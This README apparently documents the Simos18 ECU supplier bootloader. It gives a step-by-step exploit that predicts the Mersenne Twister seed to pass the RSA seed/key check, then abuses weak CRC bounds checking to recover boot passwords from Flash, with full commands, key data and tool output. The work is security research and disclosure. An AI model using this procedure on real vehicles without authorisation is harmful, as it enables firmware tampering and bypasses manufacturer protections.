# About

This project provides documentation about the Supplier Bootloader (SBOOT) provided in Simos18 ECUs, with a focus on the OTP/Customer Protection module supplied by VW AG in VW vehicles.

For more background about Simos18 in general and the later-stage (Customer Bootloader/CBOOT) exploit used for unsigned code execution, please see [my other documentation](https://github.com/bri3d/VW_Flash/blob/master/docs.md).

The SBOOT is the first part of the ECU's trust chain after the CPU mask ROM. It starts at 0x80000000 (the beginning of Program Memory) and has a few basic responsibilities:

* Early-stage startup of the Tricore CPU's peripherals and clock initialization and re-sync.
* Validation of the "Validity flags" for CBOOT, the next bootloader stage.
* Promotion of a customer-supplied CBOOT update (CBOOT_temp) into the CBOOT area, after validating the "validity flags" and CRC checksum.
* Access to a supplier "recovery" backdoor. This takes the form of an ISO-TP over CAN "command shell" which is accessed if CBOOT is invalid or a specific timing of rising edges is met on two PWM pins. This "emergency recovery" mechanism seems to be loosely shared across many modern ECUs, although the signal specifics and CAN commands seem to differ between different hardware. In Simos18, this command shell is accessed using two square-edge signals running at the same frequency but with a specific phase shift. This command shell allows the upload of an RSA-signed bootstrap loader which is executed with Flash unlocked for Write access (unlike the native Tricore BSL, which is unsigned but cannot access Flash at all). The signature-checking functionality is provided by the customer-supplied One Time Programming area starting at 80014000, and the RSA signature is validated against a public key with identifier `0x136` which is the third public key in the OTP area.

Startup pretty much happens in this order, as well. First, SBOOT sets up a large number of peripheral registers using initliazation data hardcoded in Flash. Next, SBOOT initalizes the main clocks, importantly, setting the PLL base frequency for timers to 8.75Mhz.

# Recovery Shell Entry Details (GPT/PWM/"PW")

Next, SBOOT sets up CAN message handlers, using the standard UDS channel IDs 0x7E0 and 0x7E8, and then sets up the "GPTA" comparator peripheral on the Tricore to measure two signals for "break-in." The two signals are measured as follows:

Signal 1 triggers a reset of a GPTA timer at each rising edge.
Signal 2 triggers an interrupt at each rising edge.

When the Signal 2 interrupt is triggered, two measurements are made:
* The GPTA timer counter value. This measures the distance between posedge(Sig1) and posedge(Sig2).
* The CPU central timer counter difference between the last triggered interrupts. This measures the distance between posedge(Sig2) and posedge(Sig2).

These two measurements are checked to be < 0x80A and < 0xAAA, respectively. Given the 8.75Mhz GPT and STM clocks, this yields 235.2uS for the Sig1->Sig2 measurement and 312uS for the Sig2->Sig2 measurement, setting the base frequency to 3.2kHz and the phase shift to roughly 1/4.

Please see the included Python script for a way to set these two frequencies up using pigpiod's WavePWM on the Raspberry Pi. Please note that the outputs from the Pi need to be level shifted to be registered by the Tricore in Simos18.

If the PWM signals match, two CAN messages are checked. First, a message `59 45` (`80002b70`). If this message is present, `0xA0` is returned. Next, a message `6B` is expected (`80004a48`), to which `0xA0` is again returned. If these conditions are met, SBOOT will jump into the "recovery shell" awaiting setup of a bootstrap loader.

# Recovery Shell Tasks

The recovery shell now runs four tasks.

* The first task is an ISO-TP command REPL based on a state machine, documented below.
* The second task appears to be part of the ISO-TP message pump logic for that command REPL. It also handles soft rebooting the ECU with reason code `0x200` if the REPL's state machine is set to 10dec (0xA), which occurs if a specific password is sent to the "7D" command. I am not yet sure if `0x200` as the restart reason is handled in a special way.
* The third task runs from RAM at d001fd80 . It services the Tricore Watchdog Timer and bit-bangs a fixed message out to the Port3 GPIO. It's not yet certain what the purpose of the bit-bang is - perhaps it is servicing an external watchdog peripheral, or is for debugging. More investigation is required. This is definitely a side-channel through which information can be exfiltrated (as the watchdog is serviced outside of the usual timer schedule before certain flash tasks), but probably isn't the source of an existing exploit. This also increments a timer value which is used in the main REPL to require a delay before requesting Seed/Key authentication. 
* The fourth task just counts up.

The recovery shell now sets up ISO-TP framing and expects the following messages:

```
TESTER -> EXPECTED REPLY

7D 41 43 57 -> A0, sets the "current state" to 0xA which seems to exit the command shell.
7D 4E 42 30 ("NB0") -> A0, just a part number check? Doesn't seem to alter any other state.

6B -> A0 02. This is the SBOOT version of TesterPresent, works regardless of state.
30 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? (???) -> A0 . This one is weird. It checks that int 3 is equal to a value at 8000081C, but there's nothing there... It then sets two words at D0000010 to the first two words of the payload. All 0s seems to work. This command is required to esclate the state from 0 to 2 to enable the 54 command to be accessed.
54 -> A0 XX XX XX XX 00 01 36 followed by 0x100 bytes of Seed material. This configures the Public Key with ID "0x0136", then uses a Mersenne Twister seeded with the system timer to generate 256 random bytes, encrypts the generated data using the RSA Public Key 0x136, and sends the encrypted data to the tester.
65 ??x100 -> A0 Key Response. The ECU expects the tester to be able to decrypt the random Seed data which was encrypted using the public key and send it back. This, of course, requires the corresponding private key, unless the value can be guessed or generated another way (which it can!). 
78 AA AA AA AA XX ... -> Set Address -> Value. Value is a varargs length based on the framing length from CAN. AA AA AA AA is a bounds-checked address between B0010000 and B0015000. This can be used any number of times to set up the BSL in RAM.
```

The BSL structure looks like so:   

```
B0010000 -> CRC Seed / Start Value
B0010004 -> Expected CRC Value
B0010008 -> CRC Range Count - Checked against 1
B001000C -> CRC Start Address - Bounds checked to be <= 0xb0010131
B0010010 -> CRC End Address - Bounds checked to be >= 0xb001012f
B0010130 -> BSL entry address pointer - loaded and execution jumps there. 
```
One final command is available:

`79 -> Validate and execute BSL.` This first copies the CRC header into a RAM structure for CRC validation. Next, it iterates through the CRC checksum, 0x100 bytes at a time, and then checks it against the stored value. Finally, it generates the SHAsum of the bootloader, checks it against the sum embedded in the RSA signature, and if everything matches, Flash is unlocked and then the entry point is executed in RAM.

# Recovery Side Channels / Issues

It is known that something in this recovery process is exploitable to recover the boot passwords from inside of Flash. The ISO-TP command shell seems secure in principle, and a cursory examination of the methods did not reveal any obvious bugs. The attack surface is quite small as only a few commands allow data to be sent back to them.

A few pieces are interesting so far:

* The external watchdog output can definitely exfiltrate information about the Flash process, but I'm not sure what pin it's mapped to yet.
* The CRC bounds checking on the block sent in to the BSL verification process is weak, but first we have to reach this elevated state, which requires passing the 54/65 Seed/Key process first.
* The `30 xx xx xx` handler writes data at `D0000010-D0000018` , which is later used somewhere in CBOOT. There seem to be two magic values possible here: `66778899` and `4b747352`. It as yet unknown what beneficial value these may have, if any.

# Exploit Methodology

We know that the Mersenne Twister seed number is deterministic, since no entropy is correctly introduced: it is seeded off of the system timer only, which is not an entropy source since with the same inputs, the CPU should produce the same outputs. Furthermore the seed is passed through `| 1` (odds only), so it is an even more poor source of entropy - the keyspace is only 2^31, and the realistic keyspace is very small due to the use of a deterministic source in the form of the timer.

Since CAN messages are buffered and processed in a loop pumped using the same timer, with some plausibly tight timing it is possible to "hit" a very close range of Mersenne Twister seed numbers. Because the random data which is encrypted and passed back is not dynamically salted at all, it should be possible to pass back the desired data and pass the seed/key algorithm, using Seed/Key data generated with [this tool](twister.c) . So far, my testing indicates that even with a Raspberry Pi as the tester, the system timer value can be constrained to within a few hundred thousand cycles, reducing the size of the Seed/Key space to a size which can be easily brute-forced on modern hardware. On my M1 MacBook Air, I can enumerate roughly 100,000 pairs per second on a single core.  

Next, we can use the poor bounds-checking on the CRC to begin a checksum process against the boot passwords as stored in Flash. By then quickly resetting the CPU into BSL, before the process has a chance to run multiple iterations, we are able to inspect the state of the checksum routine. And by sliding the start of the CRC, it is possible to determine the influence of each set of bytes on the CRC and to back-calculate the bytes in question, revealing the boot passwords.

# Exploit Step-By-Step

The exploit process has been proven out, but not yet automated. So far, the process works like this:

Set up ECU for Bootstrap Loader using https://github.com/bri3d/TC1791_CAN_BSL as a guide. Unfortunately, you will need to open the ECU and probe or solder to several very small vias. This is necessary to allow the use of the CPU RST pin, as well as the upload of a low-level Tricore Bootstrap Loader to read the CRC data out of RAM and access Flash once passwords are recovered.

Use "bootloader.py" from that same repository to perform the following steps:

```
(BSL) upload
(...)
Device jumping into BSL... Draining receive queue...
```
The SBOOT entry process is much more reliable when starting from the Bootstrap Loader rather than running ASW. I believe this is due to CAN buffering in Linux getting in the way of the entry messages.

Next:

```
(BSL) sboot
Setting up PWM waveforms...
Resetting ECU into Supplier Bootloader...
Sending 59 45...
Timestamp: 1614900054.113193        ID: 07e8    S                DLC:  8    a0 ff ff ff ff ff ff ff     Channel: can0
Got A0 message...
Sending 6B...
Timestamp: 1614900054.114856        ID: 07e8    S                DLC:  8    a0 02 ff ff ff ff ff ff     Channel: can0
Got A0 message...
Switching to IsoTP Socket...
Sending 0x30
a0
Sending 0x54
Seed material is:
a00000005000000136be284541338a69a6bf21caa369d3079a815f9d5c71359e922495bc27dbe86e6e441702d81e07ca318a98b2e3f83bed6f7e91f3ce375a9703013284e8de83343de688d33f5e8d4bf25f9cae3b191a816743c32a5967414c249658e421ea040b5df7b30b9e69c0a6476653f729db1c75675ce71c0904be57a694c43e243468118ba8cdc1e4b6c23a73c115eede9950051a239d97598707779e14c8ec4584e2a9e155cadfc8d526d77866047070b13d34057cf311b9fa6d9ff5223026fdaa4b722396c57b7858bc290e4320d80c4c1b31dcd1e02cb5e2ec7b4a1aa18fb768a10342328ad5c5e042a8cdfeba7607161308aeabc71c89a819ae6a43a2fa3b4cf45e49
```
There's the Seed! This process resets the ECU into the SBOOT Service Mode command shell by sending the correct PWM waveforms, and performs the Seed operation. The timing is controlled enough to allow the next step to work:

```
Simos18_SBOOT % ./twister 01D00000 be284541
**** FOUND ****
Seed: 01D1E4EE

Key Data: 
 DA0E1828 21C7E6B5 A2BBD143 12F85EFD 9E682543 FE14518B 7611F711 8249AF0E A3C3E370 771EFA0B 172B321E 1B709E32 D7217199 48621483 23B90A28 DFA71B4A 925B0A34 1D304CC9 A6E36B73 70DBDCD5 EA05EDE2 800BB6E0 17793D5C 1A338EF0 AD960625 89C66E02 061D10DE FFDD040D EC59123B E833FDB6 B745EF44 2D32DCF0 81F1CFA8 28B0BD61 E351C52A C7A6F379 5E91489C 4C872318 5888FD89 2C1A3106 DFF03E42 1342237F 3963F5F2 180FCF17 23306BC3 EF5A73EF F734D53A 8B1AC3AD 6CFA8BE3 A2120DF7 38B5B940 181EB813 8816814A 68B604A6 F17221AA A6117FF3 70A251B5 997520F8 EC472D57 092B8960 E5A644C8 6AC5007F 6CEFE33A 0002405E
Seed Data: 
 BE284541 338A69A6 BF21CAA3 69D3079A 815F9D5C 71359E92 2495BC27 DBE86E6E 441702D8 1E07CA31 8A98B2E3 F83BED6F 7E91F3CE 375A9703 013284E8 DE83343D E688D33F 5E8D4BF2 5F9CAE3B 191A8167 43C32A59 67414C24 9658E421 EA040B5D F7B30B9E 69C0A647 6653F729 DB1C7567 5CE71C09 04BE57A6 94C43E24 3468118B A8CDC1E4 B6C23A73 C115EEDE 9950051A 239D9759 8707779E 14C8EC45 84E2A9E1 55CADFC8 D526D778 66047070 B13D3405 7CF311B9 FA6D9FF5 223026FD AA4B7223 96C57B78 58BC290E 4320D80C 4C1B31DC D1E02CB5 E2EC7B4A 1AA18FB7 68A10342 328AD5C5 E042A8CD FEBA7607 161308AE ABC71C89 A819AE6A 43A2FA3B 4CF45E49
 ```
Next, we use `twister` from this repo to generate the Seed/Key data. The two parameters are 01D00000, the initial timer value to iterate up from, and BE284541, the first 32 bits of the Seed from the above commands. If your tester has different timings (I used a Raspberry Pi 3B+), you may need to increase or decrease the 01D00000 value to find a match in a reasonable amount of time. The faster the machine you can run `twister` on, the better - although it's unfortunately single threaded for the moment.

Now, we go back to the `bootstrap.py` script:

```
(BSL) sboot_sendkey DA0E182821C7E6B5A2BBD14312F85EFD9E682543FE14518B7611F7118249AF0EA3C3E370771EFA0B172B321E1B709E32D72171994862148323B90A28DFA71B4A925B0A341D304CC9A6E36B7370DBDCD5EA05EDE2800BB6E017793D5C1A338EF0AD96062589C66E02061D10DEFFDD040DEC59123BE833FDB6B745EF442D32DCF081F1CFA828B0BD61E351C52AC7A6F3795E91489C4C8723185888FD892C1A3106DFF03E421342237F3963F5F2180FCF1723306BC3EF5A73EFF734D53A8B1AC3AD6CFA8BE3A2120DF738B5B940181EB8138816814A68B604A6F17221AAA6117FF370A251B5997520F8EC472D57092B8960E5A644C86AC5007F6CEFE33A0002405E
Sending 0x65
a0
```
We're in! We've passed Seed/Key and we can start sending data to the ECU. Next up:

```
(BSL) sboot_crc_reset 8001421C
Resetting ECU into HWCFG BSL Mode...
Setting initial CRC to 0x0
a0
Setting expected CRC to 0x0
a0
Setting start CRC range count to 1
a0
Setting start CRC start address to boot passwords at 0x8001421C
a0
Setting start CRC end address to a valid area at 0xb0010130
a0
Uploading valid part number for part correlation validator
a0
Starting Validator and rebooting into BSL...
Sending BSL initialization message...
Sending BSL data...
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 537/537 [00:00<00:00, 827blocks/s]
Device jumping into BSL... Draining receive queue...
(BSL) readaddr d0010770
1c430180
(BSL) readaddr d0010778
f4ec5c4e
```
Here, we upload a small fake code block to the SBOOT command shell, consisting of a CRC header telling the shell to begin CRC checking at a specified address, 0x8001420C, and some fixed part number data necessary to pass a validator. Next, we read back the CRC and end address (to make sure only a single iteration of the CRC algorithm was allowed to progress). Now we have the CRC value for 0x8001421C-0x8001431C! An astute reader will note that this range is actually after the boot passwords and contains some crypto data from OTP (the Mersenne Twister seed and the beginning of the AES K-values, I think) - this lets us verify that our system is working, since we can checksum the known data and compare the result.

```
crchack % ./crchack -x 00000000 -i 00000000 -w 32 -p 0x4c11db7 ../Simos-Crypto/21C.bin
4e5cecf4
```

To actually recover passwords, we need to repeat this process, sliding the checksum value backwards 4 bytes at a time. Each time we slide the checksum value backwards, we can use https://github.com/resilar/crchack to generate the necessary data to match the checksum. By performing this process iteratively back to the boot passwords at 0x8001420C, we can infer their value.

```
crchack % ./crchack -x 00000000 -i 00000000 -w 32 -p 0x4c11db7 -b :4 ../Simos-Crypto/218.bin 0x4F2527F4 > 218.WRITE_PASSWORD_2.bin
```

# Happy Path

If the "Recovery" break-in doesn't occur at this stage, first a check is made against Flash at 80840500 to see if a "CBOOT_temp" awaits promotion. If it does, the CRC is validated and the CBOOT_temp is copied into the "normal" CBOOT area. SBOOT responds with some hardcoded Wait responses on CAN to keep the tester alive, and then the new CBOOT is loaded.

If no "CBOOT_temp" awaits promotion, the Valid flags (H$B) of the "main" CBOOT are checked (notably, not its CRC), a strange set of commands is sent to the Flash controller, and then CBOOT is executed.

If no Valid flags are set for "main" CBOOT, the same recovery shell is entered.

